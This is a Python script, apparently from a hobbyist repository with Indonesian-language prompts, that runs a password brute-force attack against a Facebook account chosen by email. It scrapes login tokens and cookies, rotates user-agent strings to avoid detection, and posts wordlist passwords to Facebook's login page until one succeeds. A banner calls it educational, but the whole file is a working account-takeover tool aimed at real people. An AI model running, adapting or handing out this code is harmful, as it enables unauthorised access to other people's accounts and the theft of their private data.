# Author : Muhammad Ristawakal N
# Github : Kakkoi Namae
# Tools : Bruteforce Attack On Facebook
# Modules
import os.path
import requests
import os,time
from bs4 import BeautifulSoup
import sys
import random
from colorama import init, Fore, Style
# Start
init(autoreset=True)

MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'

PAYLOAD = {}
COOKIES = {}
with open('ALL.txt', "r") as file:
	HEADERS = file.read().splitlines()
# def lenguage
def ugel_form():
	form = dict()
	cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

	header = {'User-Agent': str(random.choice(HEADERS))}
	data = requests.get(POST_URL, headers=header)

	for i in data.cookies:
		cookies[i.name] = i.value

	data = BeautifulSoup(data.text, 'html.parser').form

	if data.input['name'] == 'lsd':
		form['lsd'] = data.input['value']

	return form, cookies

def is_password(email, index, password):
	global PAYLOAD, COOKIES
	if index % 10 == 0:
		PAYLOAD, COOKIES = ugel_form()
		PAYLOAD['email'] = email
	PAYLOAD['pass'] = password
	header = {'User-Agent': str(random.choice(HEADERS))}
	r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=header)
	if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
		open('temp', 'w').write(str(r.content))
		print('\nWe got a match! Password is : ', Fore.GREEN + password)
		return True

	return False

# Logos/Banner
def brute():
	os.system ("clear")
	time.sleep(2)
	logos = """
				Code By: Muhammad Ristawakal N
			https://github.com/Kakkoinamae
================\x1b[6;30;42m Tools Brutefoce \x1b[0m=================
"""
	note = Style.BRIGHT + """
Tools Ini Betujuan Untuk Pendidikan Bukan Untuk Tujuan Ilegal,
Jadi Apapun Segala Resiko Yang Di Ambil Oleh Pemakai Author
Otomatis Tidak Bertanggung Jawab Atas Semua Yang Di Lakukan
Oleh Pemakai.
""" + Style.NORMAL + Fore.RED + """
( ©copryight Muhammad Ristawakal N )
Note: Ketik Exit Untuk Keluar Dari Program !
"""
	os.system("figlet BruteForce | lolcat")
	print (logos)
	time.sleep(1)
	print (note)

if __name__ == "__main__":
	brute()
	time.sleep(2)
	print ("")
	email = input("Masukkan Email Target : ").strip()
	if email == "Exit" or email == "exit":
		time.sleep(1)
		print ("[✓] Terima Kasih Sudah Memakai Program\nBuatan Saya By: Muhammad Ristawakal N")
		os.system ("xdg-open https://github.com/Kakkoinamae")
		sys.exit(0)
	print("[!] Memeriksa Target : ", Fore.GREEN + email)
	print ("")
	time.sleep(2)
	print ("Contoh : example.txt")

	katasandi = input("[!] Masukkan Nama file path/name\n(exp: file.txt or folder/file.txt) : ")
	time.sleep(1)
	try:
		ip = requests.get('https://api.ipify.org').text
	except requests.exceptions.ConnectionError:
		exit("[!]Koneksi Internet Anda Error\nSilahkan Periksa Koneksi Internet Anda !")
	if not os.path.isfile(katasandi):
		print(f"[x]Folder/File {katasandi} tidak di temukan\nharap masukan file worldlist yang benar\n")
		sys.exit(0)
	passwordsList = open(katasandi, 'r').read().split("\n")
	print ("[✓]Worldlist Di Temukan:", Fore.GREEN + katasandi)
	time.sleep(2)
	print ("")
	print (f"================ \x1b[6;30;42m{email} >>> {katasandi} \x1b[0m===============")
	time.sleep(2)
	print ("")

	for index, password in zip(range(passwordsList.__len__()), passwordsList):
		password = password.strip()

		if len(password) < MIN_PASSWORD_LENGTH:
			continue

		print ("[•_•]Mencoba Password [", index, "]: ",Fore.RED + password)

		if is_password(email, index, password):
			print (f"[✓]Password Found: {password}")
			break
